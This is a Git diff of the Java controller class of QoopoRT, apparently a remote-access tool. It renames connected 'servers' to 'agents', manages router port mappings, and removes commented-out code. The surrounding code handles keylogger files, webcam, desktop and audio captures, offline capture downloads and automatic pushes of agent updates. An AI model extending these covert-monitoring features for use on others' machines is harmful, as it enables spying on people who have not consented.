@@ -41,7 +41,7 @@ import qooport.utilidades.contador.ContadorBPS;
 
 public class QoopoRT {
 
-    public static String version = "v 1.5.1";
+    public static String version = "v 1.5.3";
     public static boolean MOSTRAR_NOTIFICACION = false;
     public static final HashMap<String, Asociado> SERVIDORES = new HashMap();
     public static List<DescargaArchivo> listaDescargas = new ArrayList<>();
@@ -50,6 +50,8 @@ public class QoopoRT {
     public static List<Accion> accionesSubida;// acciones a ejecutarse cuadno se completa una carga de archivo
     public static QoopoRT instancia;
     public static String tipoLetra = "Arial";
+
+    private List<MapearPuertos> mapeos = new ArrayList<>();
 
     public static void iniciar() {
         instancia = new QoopoRT();
@@ -106,13 +108,14 @@ public class QoopoRT {
     public ContadorBPS contadorBajada;
     public ContadorBPS contadorTotalBajada;
     public ContadorBPS contadorTotalSubida;
-    private List<ServListener> listaConexiones;
+    private List<ServListener> listaConexiones = new ArrayList();
     private ModoAvanzado ventana = null;
     private List<Perfil> perfiles;
     private Configuracion config;
     private boolean escuchando = false;
 
     public QoopoRT() {
+        instancia = this;
         iniciarComponente();
     }
 
@@ -301,7 +304,8 @@ public class QoopoRT {
             return;
         }
         List<String> puertosUsados = new ArrayList<>();
-        this.listaConexiones = new ArrayList<>();
+        mapeos.clear();
+        this.listaConexiones.clear();
         int tipoConexion = 0;
         String tipoConexionSTR = null;
 
@@ -313,16 +317,14 @@ public class QoopoRT {
                 } catch (Exception e) {
                     version2 = false;
                 }
-
                 boolean ssl = false;
+
                 try {
                     ssl = Boolean.valueOf((String) p.obtenerParametro("ssl"));
                 } catch (Exception e) {
                     ssl = false;
                 }
-//                if (!version2) {
-//                    continue;
-//                }
+
                 try {
                     int tipo = (int) p.obtenerParametro("tipoConexion");
                     if (tipo == 0) {
@@ -341,12 +343,10 @@ public class QoopoRT {
                     try {
                         if (!puertosUsados.contains((String) p.obtenerParametro("puerto") + "|" + tipoConexion)) {
                             //redirecciono los puetos en el router
-                            new MapearPuertos(Integer.valueOf((String) p.obtenerParametro("puerto")), 2).start();
-
-                            ServListener c1 = new ServListener(
-                                    Integer.valueOf((String) p.obtenerParametro("puerto")),
-                                    tipoConexion, version2, ssl
-                            );
+                            MapearPuertos mapeo = new MapearPuertos(Integer.valueOf((String) p.obtenerParametro("puerto")), tipoConexion);
+                            mapeo.start();
+                            mapeos.add(mapeo);
+                            ServListener c1 = new ServListener(Integer.valueOf((String) p.obtenerParametro("puerto")), tipoConexion, version2, ssl);
                             c1.start();
                             if (!listaConexiones.contains(c1)) {
                                 listaConexiones.add(c1);
@@ -358,27 +358,6 @@ public class QoopoRT {
                         ex.printStackTrace();
                         this.ponerEstado("No se puede abrir el puerto [" + (String) p.obtenerParametro("puerto") + "]" + " (" + tipoConexionSTR + ")");
                     }
-//                    try {
-//                        if (!puertosUsados.contains((String) p.obtenerParametro("puerto2") + "|" + tipoConexion)) {
-//                            //redirecciono los puetos en el router
-//                            new MapearPuertos(Integer.valueOf((String) p.obtenerParametro("puerto2")), 2).start();
-//                            TransfListener c2 = new TransfListener(
-//                                    Integer.valueOf((String) p.obtenerParametro("puerto2")),
-//                                    tipoConexion, version2, ssl
-//                            );
-//                            c2.start();
-//                            if (!listaConexionesarchivos.contains(c2)) {
-//                                listaConexionesarchivos.add(c2);
-//                            }
-//                            puertosUsados.add((String) p.obtenerParametro("puerto2") + "|" + tipoConexion);
-//                            this.ponerEstado("Esperando conexiones en el puerto [" + (String) p.obtenerParametro("puerto2") + "]" + " (" + tipoConexionSTR + ")");
-//                        }
-//                    } catch (IOException ex) {
-//                        ex.printStackTrace();
-//                        this.ponerEstado("No se puede abrir el puerto [" + (String) p.obtenerParametro("puerto2") + "]" + " (" + tipoConexionSTR + ")");
-//                    }
-//                } else {
-//                    System.out.println("directa");
                 }
             }
             escuchando = true;
@@ -394,7 +373,6 @@ public class QoopoRT {
             programadorMiniatura = Executors.newScheduledThreadPool(1);
             programadorMiniatura.scheduleAtFixedRate(hiloMiniatura, config.getSegundos(), config.getSegundos(), TimeUnit.SECONDS);
         }
-
     }
 
     public void detenerServicio() {
@@ -413,11 +391,11 @@ public class QoopoRT {
         for (ServListener c : this.listaConexiones) {
             c.stopPara();
         }
-//        for (TransfListener c : this.listaConexionesarchivos) {
-//            c.stopPara();
-//        }
-        this.listaConexiones = new ArrayList<>();
-//        this.listaConexionesarchivos = new ArrayList<>();
+        for (MapearPuertos c : this.mapeos) {
+            c.liberarMap();
+        }
+        mapeos.clear();
+        this.listaConexiones.clear();
         escuchando = false;
         try {
             ventana.getBtnIniciar().setText("Iniciar");
@@ -446,12 +424,11 @@ public class QoopoRT {
         }
     }
 
-    public void agregarServidor(Asociado serv) {
+    public void agregarAgente(Asociado agente) {
         try {
-
-            ventana.getEquipos().agregarServidor(serv);
-            QoopoRT.SERVIDORES.put(serv.getIdentificador(), serv);
-            File ds = new File(getDirEquipos().getAbsoluteFile(), serv.getUsuario() + "_" + serv.getHost());
+            ventana.getEquipos().agregarServidor(agente);
+            QoopoRT.SERVIDORES.put(agente.getIdentificador(), agente);
+            File ds = new File(getDirEquipos().getAbsoluteFile(), agente.getUsuario() + "_" + agente.getHost());
             if (!ds.exists()) {
                 ds.mkdirs();
             }
@@ -488,36 +465,36 @@ public class QoopoRT {
                 dCapturas.mkdirs();
             }
 
-            serv.setdPrincipal(ds);
-            serv.setdDescargas(dw);
-            serv.setdImagenes(di);
-            serv.setdWebCam(dwc);
-            serv.setdEscritorio(dwe);
-            serv.setdAudio(da);
-            serv.setfKeylogger(dk);
-            serv.setdInfor(dInfo);
-            serv.setdCapturas(dCapturas);
+            agente.setdPrincipal(ds);
+            agente.setdDescargas(dw);
+            agente.setdImagenes(di);
+            agente.setdWebCam(dwc);
+            agente.setdEscritorio(dwe);
+            agente.setdAudio(da);
+            agente.setfKeylogger(dk);
+            agente.setdInfor(dInfo);
+            agente.setdCapturas(dCapturas);
 //            serv.setfKeylogger(new File(dk, "keylogger.txt"));
             if (ventana.getChkVistaPrevia().isSelected()) {
-                serv.pedirPantallaMiniatura();
+                agente.pedirPantallaMiniatura();
             }
             if (ventana.getChkVistaPreviaWC().isSelected()) {
                 if (ventana.getChkVistaPreviaWCAndroid().isSelected()) {
-                    if (serv.isAndroid()) {
-                        serv.pedirWebCamMiniatura();
+                    if (agente.isAndroid()) {
+                        agente.pedirWebCamMiniatura();
                     }
                 } else {
-                    serv.pedirWebCamMiniatura();
+                    agente.pedirWebCamMiniatura();
                 }
             }
             //QoopoRT.this.ponerEstado("Se conectó servidor: [" + serv.getInformacion() + " - (" + serv.getIp() + ") ]");
-            QoopoRT.this.ponerEstado("Se conectó servidor: " + serv.getInfoIP());
+            QoopoRT.this.ponerEstado("Se conectó agente: " + agente.getInfoIP());
             boolean actualizadoServer = false;
             //actualizo automaticamente el servidor
-            if (!serv.isAndroid()
+            if (!agente.isAndroid()
                     && ventana.getPnlConfiguracion().getChkActualizarserver().isSelected()) {
                 try {
-                    String s_version = serv.getDatos()[9].trim();
+                    String s_version = agente.getDatos()[9].trim();
 //                        String s_version = datos[11].toString().replaceAll("\\.", "");
                     String s_version2 = ventana.getPnlConfiguracion().getTxtVersion().getText().trim();
 //                        int version = Integer.valueOf(s_version);
@@ -526,12 +503,12 @@ public class QoopoRT {
 
                     if (!s_version.equals(s_version2)) {
                         if (!new File(ventana.getPnlConfiguracion().getTxtRutaArchivo().getText()).exists()) {
-                            QoopoRT.this.ponerEstado("Se debe actualizar el servidor (" + serv.getInformacion() + ") de la versión " + s_version + " a la version " + s_version2 + ". Pero el archivo indicado no existe.");
+                            QoopoRT.this.ponerEstado("Se debe actualizar el agente (" + agente.getInformacion() + ") de la versión " + s_version + " a la version " + s_version2 + ". Pero el archivo indicado no existe.");
                         } else {
                             actualizadoServer = true;
-                            serv.crearCarpeta("a", "<server>/../");
-                            serv.actualizarServidor(ventana.getPnlConfiguracion().getTxtRutaArchivo().getText(), "<server>/../a");
-                            QoopoRT.this.ponerEstado("Se va a actualizar automáticamente el servidor (" + serv.getInformacion() + ") de la version " + s_version + "   a la version " + s_version2);
+                            agente.crearCarpeta("a", "<server>/../");
+                            agente.actualizarServidor(ventana.getPnlConfiguracion().getTxtRutaArchivo().getText(), "<server>/../a");
+                            QoopoRT.this.ponerEstado("Se va a actualizar automáticamente el agente (" + agente.getInformacion() + ") de la version " + s_version + "   a la version " + s_version2);
                         }
                     }
                 } catch (Exception e) {
@@ -540,17 +517,16 @@ public class QoopoRT {
             //pido recibir automaticamente el archivo de capturas offline
             if (!actualizadoServer && ventana.getPnlConfiguracion().getChkPedirArchivoOffline().isSelected()) {
                 try {
-                    serv.descargarListaOffline();
-                    QoopoRT.this.ponerEstado("Se solicita al servidor (" + serv.getInformacion() + " descargar el archivo de captura offline");
+                    agente.descargarListaOffline();
+                    QoopoRT.this.ponerEstado("Se solicita al agente (" + agente.getInformacion() + " descargar el archivo de captura offline");
                 } catch (Exception e) {
                 }
             }
             if (MOSTRAR_NOTIFICACION) {
-                Notificaciones.mostrarNotificacion(serv);
-                Notificaciones.sondidoConectar();
+                Notificaciones.mostrarNotificacion(agente);
+//                Notificaciones.sondidoConectar();
             }
-
-            serv.enviarComando(Protocolo.GET_INFO_COMPLETA);//pido la info completa para almacenarla en el directorio
+            agente.enviarComando(Protocolo.GET_INFO_COMPLETA);//pido la info completa para almacenarla en el directorio
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -561,7 +537,7 @@ public class QoopoRT {
         if (ventana != null) {
             boolean encontrado = ventana.getEquipos().actualizarDatosServidor(serv);
             if (!encontrado) {
-                this.agregarServidor(serv);
+                this.agregarAgente(serv);
             }
             if (ventana.getServerSeleccionado().equals(serv.getIdentificador())) {
                 ventana.mostrarMiniatura(serv);
